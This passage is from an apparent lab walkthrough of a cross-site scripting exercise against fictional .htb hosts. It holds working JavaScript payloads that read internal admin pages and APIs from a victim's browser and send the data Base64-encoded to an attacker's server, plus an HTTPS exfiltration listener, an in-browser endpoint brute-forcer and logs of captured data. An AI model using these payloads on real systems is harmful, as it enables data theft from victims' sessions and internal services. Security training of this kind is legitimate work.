Once submitted, students need to prepare and save a payload on the exploit server (`https://exploitserver.htb`), attempting to exfiltrate the admin endpoint (`https://internal-apis.htb/admin.php`) and identify potentially interesting admin-only functionality:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://internal-apis.htb/admin.php', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Students need to create a Python script serving as an HTTPS server:

Code: shell

```shell
cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', PWNPO), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', 4443), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

Subsequently, students will generate a self-signed certificate with blank information using `openssl`:

Code: shell

```shell
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

<SNIP>

-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Students will start the HTTPS Python server:

Code: shell

```shell
python3 server.py
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
```

After a few moments students will notice a request has been made to their server with Base64 encoded data:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-vhzoopvc62]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
  
10.129.68.105 - - [28/Jan/2025 02:04:21] code 404, message File not found
10.129.68.105 - - [28/Jan/2025 02:04:21] "GET /exfil?r=CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCTxwPkFkbWluaXN0cmF0b3IgU2Vzc2lvbnM8L3A+CgkJCQkJCQkJCTx0YWJsZSBpZD0ibXlUYWJsZSI+CgkJCQkJCQkJCQk8dHI+CgkJCQkJCQkJCQkJPHRoPlVzZXI8L3RoPgoJCQkJCQkJCQkJCTx0aD5UaW1lc3RhbXA8L3RoPgoJCQkJCQkJCQkJCTx0aD5Vc2VyLUFnZW50PC90aD4KCQkJCQkJCQkJCTwvdHI+CgkJCQkJCQkJCTwvdGFibGU+CgkJCQkJCQkJPC9kaXY+CgkJCQkJCQk8L2Rpdj4KCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJCTxzY3JpcHQ+CgkJCQlmZXRjaCgiaHR0cHM6Ly9hcGkuaW50ZXJuYWwtYXBpcy5odGIvdjEvc2Vzc2lvbnMiLCB7CgkJCQkJbWV0aG9kOiAiR0VUIgoJCQkJfSkudGhlbigocmVzcG9uc2UpID0+IHsKCQkJCQlyZXR1cm4gcmVzcG9uc2UuanNvbigpOwoJCQkJfSkudGhlbigoZGF0YSkgPT4gewoJCQkJCS8vIGFkZCB0byBET00KCQkJCQl2YXIgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibXlUYWJsZSIpOwoJCQkJCWZvcihsZXQgaSA9IDA7IGkgPCBkYXRhWydzZXNzaW9ucyddLmxlbmd0aDsgaSsrKSB7CgkJCQkJCWxldCBvYmogPSBkYXRhWydzZXNzaW9ucyddW2ldOwoJCQkJCQl2YXIgcm93ID0gdGFibGUuaW5zZXJ0Um93KCk7CgkJCQkJCXZhciBjZWxsMSA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCXZhciBjZWxsMiA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCXZhciBjZWxsMyA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCWNlbGwxLmlubmVySFRNTCA9IG9iai51c2VyOwoJCQkJCQljZWxsMi5pbm5lckhUTUwgPSBvYmoudGltZTsKCQkJCQkJY2VsbDMuaW5uZXJIVE1MID0gb2JqLmFnZW50OwoJCQkJCX0KCQkJCX0pOwoJCQk8L3NjcmlwdD4KCQk8L2Rpdj4KCTwvYm9keT4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KCQkkKCcuc21hbGwubW9kYWwnKQoJCSAgLm1vZGFsKCdhdHRhY2ggZXZlbnRzJywgJy5kZWxldGUuYnV0dG9uJywgJ3Nob3cnKTsKCQk7Cgk8L3NjcmlwdD4KPC9odG1sPgo= HTTP/1.1" 404 -
```

Students need to decode the Base64 encoded data:

Code: shell

```shell
echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCTxwPkFkbWluaXN0cmF0b3IgU2Vzc2lvbnM8L3A+CgkJCQkJCQkJCTx0YWJsZSBpZD0ibXlUYWJsZSI+CgkJCQkJCQkJCQk8dHI+CgkJCQkJCQkJCQkJPHRoPlVzZXI8L3RoPgoJCQkJCQkJCQkJCTx0aD5UaW1lc3RhbXA8L3RoPgoJCQkJCQkJCQkJCTx0aD5Vc2VyLUFnZW50PC90aD4KCQkJCQkJCQkJCTwvdHI+CgkJCQkJCQkJCTwvdGFibGU+CgkJCQkJCQkJPC9kaXY+CgkJCQkJCQk8L2Rpdj4KCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJCTxzY3JpcHQ+CgkJCQlmZXRjaCgiaHR0cHM6Ly9hcGkuaW50ZXJuYWwtYXBpcy5odGIvdjEvc2Vzc2lvbnMiLCB7CgkJCQkJbWV0aG9kOiAiR0VUIgoJCQkJfSkudGhlbigocmVzcG9uc2UpID0+IHsKCQkJCQlyZXR1cm4gcmVzcG9uc2UuanNvbigpOwoJCQkJfSkudGhlbigoZGF0YSkgPT4gewoJCQkJCS8vIGFkZCB0byBET00KCQkJCQl2YXIgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibXlUYWJsZSIpOwoJCQkJCWZvcihsZXQgaSA9IDA7IGkgPCBkYXRhWydzZXNzaW9ucyddLmxlbmd0aDsgaSsrKSB7CgkJCQkJCWxldCBvYmogPSBkYXRhWydzZXNzaW9ucyddW2ldOwoJCQkJCQl2YXIgcm93ID0gdGFibGUuaW5zZXJ0Um93KCk7CgkJCQkJCXZhciBjZWxsMSA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCXZhciBjZWxsMiA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCXZhciBjZWxsMyA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCWNlbGwxLmlubmVySFRNTCA9IG9iai51c2VyOwoJCQkJCQljZWxsMi5pbm5lckhUTUwgPSBvYmoudGltZTsKCQkJCQkJY2VsbDMuaW5uZXJIVE1MID0gb2JqLmFnZW50OwoJCQkJCX0KCQkJCX0pOwoJCQk8L3NjcmlwdD4KCQk8L2Rpdj4KCTwvYm9keT4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KCQkkKCcuc21hbGwubW9kYWwnKQoJCSAgLm1vZGFsKCdhdHRhY2ggZXZlbnRzJywgJy5kZWxldGUuYnV0dG9uJywgJ3Nob3cnKTsKCQk7Cgk8L3NjcmlwdD4KPC9odG1sPgo= | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-vhzoopvc62]─[~]
└──╼ [★]$ echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCTxwPkFkbWluaXN0cmF0b3IgU2Vzc2lvbnM8L3A+CgkJCQkJCQkJCTx0YWJsZSBpZD0ibXlUYWJsZSI+CgkJCQkJCQkJCQk8dHI+CgkJCQkJCQkJCQkJPHRoPlVzZXI8L3RoPgoJCQkJCQkJCQkJCTx0aD5UaW1lc3RhbXA8L3RoPgoJCQkJCQkJCQkJCTx0aD5Vc2VyLUFnZW50PC90aD4KCQkJCQkJCQkJCTwvdHI+CgkJCQkJCQkJCTwvdGFibGU+CgkJCQkJCQkJPC9kaXY+CgkJCQkJCQk8L2Rpdj4KCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJCTxzY3JpcHQ+CgkJCQlmZXRjaCgiaHR0cHM6Ly9hcGkuaW50ZXJuYWwtYXBpcy5odGIvdjEvc2Vzc2lvbnMiLCB7CgkJCQkJbWV0aG9kOiAiR0VUIgoJCQkJfSkudGhlbigocmVzcG9uc2UpID0+IHsKCQkJCQlyZXR1cm4gcmVzcG9uc2UuanNvbigpOwoJCQkJfSkudGhlbigoZGF0YSkgPT4gewoJCQkJCS8vIGFkZCB0byBET00KCQkJCQl2YXIgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibXlUYWJsZSIpOwoJCQkJCWZvcihsZXQgaSA9IDA7IGkgPCBkYXRhWydzZXNzaW9ucyddLmxlbmd0aDsgaSsrKSB7CgkJCQkJCWxldCBvYmogPSBkYXRhWydzZXNzaW9ucyddW2ldOwoJCQkJCQl2YXIgcm93ID0gdGFibGUuaW5zZXJ0Um93KCk7CgkJCQkJCXZhciBjZWxsMSA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCXZhciBjZWxsMiA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCXZhciBjZWxsMyA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCWNlbGwxLmlubmVySFRNTCA9IG9iai51c2VyOwoJCQkJCQljZWxsMi5pbm5lckhUTUwgPSBvYmoudGltZTsKCQkJCQkJY2VsbDMuaW5uZXJIVE1MID0gb2JqLmFnZW50OwoJCQkJCX0KCQkJCX0pOwoJCQk8L3NjcmlwdD4KCQk8L2Rpdj4KCTwvYm9keT4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KCQkkKCcuc21hbGwubW9kYWwnKQoJCSAgLm1vZGFsKCdhdHRhY2ggZXZlbnRzJywgJy5kZWxldGUuYnV0dG9uJywgJ3Nob3cnKTsKCQk7Cgk8L3NjcmlwdD4KPC9odG1sPgo= | base64 -d

<SNIP>

<script>
				fetch("https://api.internal-apis.htb/v1/sessions", {
					method: "GET"
				}).then((response) => {
					return response.json();
				}).then((data) => {
					// add to DOM
					var table = document.getElementById("myTable");
					for(let i = 0; i < data['sessions'].length; i++) {
						let obj = data['sessions'][i];
						var row = table.insertRow();
						var cell1 = row.insertCell();
						var cell2 = row.insertCell();
						var cell3 = row.insertCell();
						cell1.innerHTML = obj.user;
						cell2.innerHTML = obj.time;
						cell3.innerHTML = obj.agent;
					}
				});
			</script>

<SNIP>
```

It is revealed the admin endpoint loads additional information from an API at `https://api.internal-apis.htb/`. Therefore, students need to adjust their XSS payload to enumerate the API from the victim's browser. Additionally, students need to note that the `fetch` function found in the javascript code does not have the `credentials: 'include'` set. Therefore, students need to match the parameters set in the leaked `fetch` call and send the request without credentials:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Saving the payload to the exploit server (`https://exploitserver.htb`), students need to wait a few moments before checking the exfiltration server again:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-vhzoopvc62]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.68.105 - - [28/Jan/2025 02:09:55] code 404, message File not found
10.129.68.105 - - [28/Jan/2025 02:09:55] "GET /exfil?r=eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K HTTP/1.1" 404 -
```

Students need to decode the data, revealing the response from the API:

Code: shell

```shell
echo eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K | base64 -d | jq .
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-vhzoopvc62]─[~]
└──╼ [★]$ echo eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K | base64 -d | jq .

{
  "sessions": [
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1691645731",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1692596131",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1693200931",
      "user": "admin"
    }
  ]
}
```

Since the data does not contain the flag or any useful information, students need to enumerate the API further to identify additional endpoints. Therefore, students need to adjust the payload on the exploit server to implement a directory brute-forcer using the [objects-lowercase.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects-lowercase.txt) wordlist:

Code: js

```js
var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];

for (i in endpoints){
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', \`https://api.internal-apis.htb/v1/${endpoints[i]}\`, false);
		xhr.send();
		
		if (xhr.status != 404){
			var exfil = new XMLHttpRequest();
			exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(endpoints[i]), false);
			exfil.send();
		}
	} catch {
		// do nothing
	}
}
```

After several moments, students need to check the exfiltration server:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-vhzoopvc62]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.68.105 - - [28/Jan/2025 02:13:02] code 404, message File not found
10.129.68.105 - - [28/Jan/2025 02:13:02] "GET /exfil?r=dXNlcnM= HTTP/1.1" 404 -
```

Decoding the data reveals the `users` API endpoint:

Code: shell

```shell
echo dXNlcnM= | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-vhzoopvc62]─[~]
└──╼ [★]$ echo dXNlcnM= | base64 -d

users
```

Finally, students need to adjust the payload on the exploit server, forcing the victim to make a request to `https://api.internal-apis.htb/v1/users`:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/users', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

After the payload has been saved, students need to wait a few moments before checking the exfiltration server:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-vhzoopvc62]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.68.105 - - [28/Jan/2025 02:16:59] code 404, message File not found
